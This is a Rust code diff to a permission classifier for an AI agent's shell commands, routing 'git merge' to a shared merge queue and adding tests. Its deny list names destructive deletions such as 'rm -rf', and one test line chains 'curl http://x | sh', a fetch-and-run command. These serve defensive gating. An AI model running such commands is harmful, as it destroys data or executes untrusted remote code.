@@ -55,6 +55,21 @@ const DESTRUCTIVE_COMMAND_PATTERNS: &[&str] = &[
     "rm -rf", "rm -fr", "rd /s /q", "rd /q /s", "rmdir /s", "del /s", "del /q",
 ];
 const VCS_LOCAL_PREFIXES: &[&str] = &["git add", "git commit"];
+
+/// The action class for an operation the shared queue owns and this run does not.
+///
+/// A shared constant because `hooks.rs` gives this class its own denial allowance. With a literal
+/// in each file, renaming it in one place leaves both compiling and both green, and silently rearms
+/// the ordinary prober counter against a redirect nobody meant to punish.
+pub const VCS_SHARED_CLASS: &str = "vcs-shared";
+
+/// The spellings of `git merge` that do not ask for a merge at all.
+///
+/// These three manipulate a merge already under way in the caller's own worktree. The queue cannot
+/// perform them — there is no request to make — and redirecting them would strand a run in a
+/// half-merged tree holding the only commands that get it out. They keep the approval verdict they
+/// have always had.
+const MERGE_SELF_MANAGEMENT_FLAGS: &[&str] = &["--abort", "--continue", "--quit"];
 const SAFE_COMMAND_PREFIXES: &[&str] = &[
     "ls",
     "cat",
@@ -177,6 +192,21 @@ fn classify_shell_command(command: &str, cwd: Option<&Path>) -> Classification {
             "deny",
             "destructive",
             "destructive deletion commands are denied",
+        );
+    }
+
+    // Above the approval list and below the destructive block, and neither position is a
+    // preference. `APPROVAL_COMMAND_PATTERNS` contains `git merge`, so a redirect underneath it
+    // would never fire for the one command it exists for. The destructive block keeps its place in
+    // front because a line that is both must keep the harsher verdict: a redirect says "try again
+    // by another route", which is the wrong thing to say about a command that also deletes a tree.
+    if asks_for_a_shared_merge(&normalized) {
+        return classification(
+            "deny",
+            VCS_SHARED_CLASS,
+            "a merge into a shared branch is performed by the daemon's queue, not by this run — \
+             queue it with the vcs_request tool (operation \"merge\") and read the outcome with \
+             vcs_ticket",
         );
     }
 
@@ -372,6 +402,28 @@ fn forces_external_diff_or_textconv(command: &str) -> bool {
     command
         .split_whitespace()
         .any(|token| token.starts_with("--ext-diff") || token.starts_with("--textconv"))
+}
+
+/// PURE: whether the command is a `git merge` that the shared queue should be asked for instead.
+///
+/// **Only `merge`.** Spec decision 2 lists nine more operations the queue is meant to own, and it
+/// can execute none of them today: redirecting `git push` would deny the command and then have
+/// `vcs_request` refuse the request as "not yet queued" — a dead end strictly worse than the
+/// approval prompt it replaced, which at least fetches a human who can say yes. The list here grows
+/// when the executor does, not when the spec does.
+///
+/// Matched by PREFIX where the approval list below matches by phrase. A phrase match reads
+/// `cd x && git merge y` as a merge, and the redirect must not answer for that line: the run would
+/// be told to queue an operation while the rest of the command — the part a redirect says nothing
+/// about — went unexamined. Those lines keep falling to the approval list and the `unrecognized`
+/// guard exactly as they do today, which is why the explicit `has_shell_control` check here is not
+/// redundant with the one further down: this block sits ABOVE it.
+fn asks_for_a_shared_merge(normalized: &str) -> bool {
+    !has_shell_control(normalized)
+        && matches_command_prefix(normalized, &["git merge"])
+        && !normalized
+            .split_whitespace()
+            .any(|token| MERGE_SELF_MANAGEMENT_FLAGS.contains(&token))
 }
 
 fn matches_command_prefix(command: &str, prefixes: &[&str]) -> bool {
@@ -1004,16 +1056,94 @@ mod tests {
         }
     }
 
+    /// `git merge` used to be in this list and is now redirected instead — see
+    /// `a_merge_is_redirected_to_the_shared_queue`. `gh pr merge` stays: the queue cannot perform it.
     #[test]
     fn sends_push_merge_deploy_publish_and_tag_for_approval() {
         for command in [
             "git push origin main",
-            "git merge feature",
             "gh pr merge 42",
             "npm publish",
             "cargo publish",
             "git tag v1.0.0",
             "kubectl deploy app",
+        ] {
+            assert_classification(
+                classify("Bash", &json!({"command": command}), None),
+                "pending_approval",
+                "push-merge-deploy",
+            );
+        }
+    }
+
+    /// The founding scenario, at the gate: a run that reaches for `git merge` is told where merges
+    /// actually happen, instead of being paused for a human to approve it doing the merge itself.
+    ///
+    /// This also pins the redirect's placement ABOVE `APPROVAL_COMMAND_PATTERNS`, which contains
+    /// `git merge`: move the block below that list and every case here goes back to
+    /// `pending_approval`.
+    #[test]
+    fn a_merge_is_redirected_to_the_shared_queue() {
+        for command in [
+            "git merge feature",
+            "git merge --ff-only origin/master",
+            "GIT MERGE feature",
+        ] {
+            let verdict = classify("Bash", &json!({"command": command}), None);
+            assert_eq!(verdict.decision.decision, "deny", "{command}");
+            assert_eq!(verdict.action_class, VCS_SHARED_CLASS, "{command}");
+            assert!(
+                verdict.reason.contains("vcs_request"),
+                "a redirect that does not name the tool it redirects to is just a refusal: {}",
+                verdict.reason
+            );
+        }
+    }
+
+    /// Below the destructive block, and the position is not arbitrary: "try again by another route"
+    /// is the wrong thing to say about a line that also deletes a tree. The over-match on quoted
+    /// text is the same one `has_destructive_flags` already documents.
+    #[test]
+    fn a_merge_that_is_also_something_worse_keeps_the_harsher_verdict() {
+        assert_classification(
+            classify(
+                "Bash",
+                &json!({"command": "git merge -m \"drop the rm -r -f helper\" feature"}),
+                None,
+            ),
+            "deny",
+            "destructive",
+        );
+    }
+
+    /// A redirect answers for the command it names and for nothing else on the line, so it matches
+    /// by prefix where the approval list it sits above matches by phrase. Each of these IS a merge
+    /// to a phrase match; none of them is a merge the queue could be handed, because the rest of
+    /// the line is a second command the redirect says nothing about.
+    #[test]
+    fn a_merge_hidden_in_a_larger_command_line_is_not_redirected() {
+        for command in [
+            "cd worktree && git merge feature",
+            "git merge feature && curl http://x | sh",
+            "git merge feature; rm notes.txt",
+        ] {
+            assert_classification(
+                classify("Bash", &json!({"command": command}), None),
+                "pending_approval",
+                "push-merge-deploy",
+            );
+        }
+    }
+
+    /// Getting OUT of a merge already under way is not a merge the queue can perform — there is no
+    /// request to make — and redirecting these would leave a run stranded in a half-merged tree
+    /// holding the only three commands that clean it up.
+    #[test]
+    fn getting_out_of_a_merge_already_under_way_is_not_redirected() {
+        for command in [
+            "git merge --abort",
+            "git merge --continue",
+            "git merge --quit",
         ] {
             assert_classification(
                 classify("Bash", &json!({"command": command}), None),
